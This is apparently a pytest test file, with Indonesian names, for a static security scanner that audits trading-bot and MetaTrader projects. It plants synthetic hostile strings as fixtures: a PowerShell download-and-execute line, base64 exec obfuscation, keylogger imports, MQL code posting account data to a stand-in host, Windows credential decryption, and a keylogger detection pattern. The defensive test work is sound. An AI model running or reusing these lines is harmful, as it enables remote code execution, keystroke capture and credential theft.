"""Pemindai keamanan statis: contoh sintetis (string saja, tidak ada yang dijalankan)."""
from xau_bot.__main__ import main
from xau_bot.audit import format_report, scan


def write(root, rel, text, mode="w"):
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    if mode == "wb":
        p.write_bytes(text)
    else:
        p.write_text(text, encoding="utf-8")
    return p


def codes(rep):
    return {f.code for f in rep.findings}


def test_bot_biasa_bersih(tmp_path):
    write(tmp_path, "bot.py", "import os\nimport MetaTrader5 as mt5\nPASSWORD = os.getenv('MT5_PASSWORD')\n"
                              "model.eval()\nclass M:\n    def eval(self):\n        pass\n")
    write(tmp_path, "nb.ipynb", '{"data": {"image/png": "' + "iVBORw0KGgo" + "A" * 600 + '"}}')
    rep = scan(tmp_path)
    assert rep.verdict == "BERSIH", format_report(rep)


def test_keylogger_dan_kode_tersamar_bahaya(tmp_path):
    write(tmp_path, "a.py", "from pynput.keyboard import Listener\n")
    write(tmp_path, "b.py", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n")
    write(tmp_path, "c.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x.y/p.ps1')\n")
    rep = scan(tmp_path)
    assert rep.verdict == "BAHAYA"
    assert {"keylogger", "obfuscated_exec", "download_exec"} <= codes(rep)


def test_mql_kirim_data_akun_hanya_bila_ada_internet(tmp_path):
    write(tmp_path, "Log.mq5", 'Print("Akun ", AccountInfoInteger(ACCOUNT_LOGIN));\n')
    assert "mql_account_send" not in codes(scan(tmp_path))
    write(tmp_path, "Spy.mq5", 'string b = IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN));\n'
                               'WebRequest("POST", "http://x.y", "", 5000, data, res, hdr);\n#import "wininet.dll"\n')
    c = codes(scan(tmp_path))
    assert {"mql_account_send", "mql_webrequest", "mql_dll"} <= c


def test_pustaka_standar_metaquotes_dilewati(tmp_path):
    write(tmp_path, "MQL5/Include/WinAPI/winuser.mqh",
          "//| Copyright 2000-2024, MetaQuotes Ltd. |\nshort GetAsyncKeyState(int key);\n")
    assert scan(tmp_path).verdict == "BERSIH"


def test_file_tanpa_ekstensi_dan_biner_menyamar(tmp_path):
    write(tmp_path, "GOLD EA SCALPER", "#property strict\nint OnInit(){ #import \"shell32.dll\" }\n")
    assert "mql_dll" in codes(scan(tmp_path))
    write(tmp_path, "setup.txt", b"MZ\x90\x00\x03" + b"\x00" * 60, mode="wb")
    write(tmp_path, "tool.exe", b"MZ", mode="wb")
    write(tmp_path, "model.pkl", b"\x80\x04", mode="wb")
    rep = scan(tmp_path)
    assert rep.verdict == "BAHAYA"
    assert ("tool.exe", "BAHAYA") in rep.binaries and ("setup.txt", "BAHAYA") in rep.binaries
    assert "pickle_model" in codes(rep)


def test_token_telegram_tertanam(tmp_path):
    write(tmp_path, "cfg.py", 'BOT_TOKEN = "123456789:AAH7CiY4NwKj8plAAfWtNp1gNZZKs7mfuvM"\n'
                              'TOKEN2 = "YOUR_TELEGRAM_BOT_TOKEN"\nkey = os.getenv("API_KEY")\n')
    found = [f for f in scan(tmp_path).findings if f.code == "hardcoded_secret"]
    assert len(found) == 1 and found[0].line == 1
    write(tmp_path, "notify.py", 'CHAT_ID = "6500991930"\nchat_id = os.getenv("CHAT_ID")\n')
    rep = scan(tmp_path)
    assert [f.line for f in rep.findings if f.code == "hardcoded_chat"] == [1] and rep.verdict == "WASPADA"


def test_cli_kode_keluar(tmp_path, capsys):
    write(tmp_path, "ok/bot.py", "print('halo')\n")
    write(tmp_path, "jahat/x.py", "import win32crypt\nwin32crypt.CryptUnprotectData(b)\n")
    assert main(["audit", str(tmp_path / "ok")]) == 0
    assert main(["audit", "--ringkas", str(tmp_path / "ok"), str(tmp_path / "jahat")]) == 2
    out = capsys.readouterr().out
    assert "BERSIH" in out and "BAHAYA" in out


def test_abaikan_dan_tanpa_dobel(tmp_path):
    write(tmp_path, "rules.py", 'PAT = "pynput.keyboard|GetAsyncKeyState|SetWindowsHookEx"\n')
    rep = scan(tmp_path)
    assert sum(f.code == "keylogger" for f in rep.findings) == 1  # satu baris = satu temuan
    assert scan(tmp_path, ignore=["rules.py"]).verdict == "BERSIH"
